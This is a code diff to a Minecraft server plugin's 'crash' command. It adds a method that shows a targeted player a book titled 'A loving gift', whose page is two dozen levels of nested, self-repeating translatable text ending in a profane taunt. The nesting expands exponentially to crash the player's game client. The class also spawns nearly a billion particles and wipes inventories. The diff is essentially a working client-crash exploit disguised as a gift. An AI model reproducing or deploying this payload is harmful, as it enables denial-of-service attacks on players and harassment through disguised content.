@@ -4,7 +4,9 @@ import creativitium.revolution.administration.Administration;
 import creativitium.revolution.foundation.command.CommandParameters;
 import creativitium.revolution.foundation.command.RCommand;
 import creativitium.revolution.foundation.command.SourceType;
+import net.kyori.adventure.inventory.Book;
 import net.kyori.adventure.text.Component;
+import net.kyori.adventure.text.format.NamedTextColor;
 import org.bukkit.Material;
 import org.bukkit.Particle;
 import org.bukkit.command.CommandSender;
@@ -43,7 +45,35 @@ public class Command_crash extends RCommand
             switch (method)
             {
                 case PARTICLES -> player.spawnParticle(Particle.ASH, player.getLocation(), 999999999);
-                case DECIMATOR ->
+                case DECIMATOR -> player.openBook(Book.builder()
+                        .author(Component.text(sender.getName()))
+                        .title(Component.text("A loving gift").color(NamedTextColor.LIGHT_PURPLE))
+                        .pages(Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s",
+                            Component.text("GET ABSOLUTELY FUCKED!")))))))))))))))))))))))))
+                        .build());
+                case INVENTORY_DECIMATOR ->
                 {
                     player.getInventory().clear();
 
@@ -104,6 +134,7 @@ public class Command_crash extends RCommand
     public enum Method
     {
         PARTICLES,
+        INVENTORY_DECIMATOR,
         DECIMATOR;
 
         public static Method getMethod(String name)
